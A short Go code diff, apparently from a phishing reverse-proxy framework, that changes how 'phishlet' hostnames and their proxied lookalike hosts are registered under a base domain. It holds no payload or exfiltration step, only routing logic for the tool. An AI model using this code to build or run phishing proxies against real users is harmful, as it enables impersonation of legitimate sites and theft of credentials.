@@ -62,13 +62,19 @@ func (r *phishletResolver) register(p *Phishlet) {
 	r.mu.Lock()
 	defer r.mu.Unlock()
 
-	if old, ok := r.phishlets[p.Name]; ok && old.Hostname != "" {
+	if old, ok := r.phishlets[p.Name]; ok && old.BaseDomain != "" {
 		delete(r.hostnames, strings.ToLower(old.Hostname))
+		for _, ph := range old.ProxyHosts {
+			delete(r.hostnames, strings.ToLower(ph.PhishHost(old.BaseDomain)))
+		}
 	}
 
 	r.phishlets[p.Name] = p
-	if p.Enabled && p.Hostname != "" {
+	if p.Enabled && p.BaseDomain != "" {
 		r.hostnames[strings.ToLower(p.Hostname)] = p
+		for _, ph := range p.ProxyHosts {
+			r.hostnames[strings.ToLower(ph.PhishHost(p.BaseDomain))] = p
+		}
 	}
 }
 
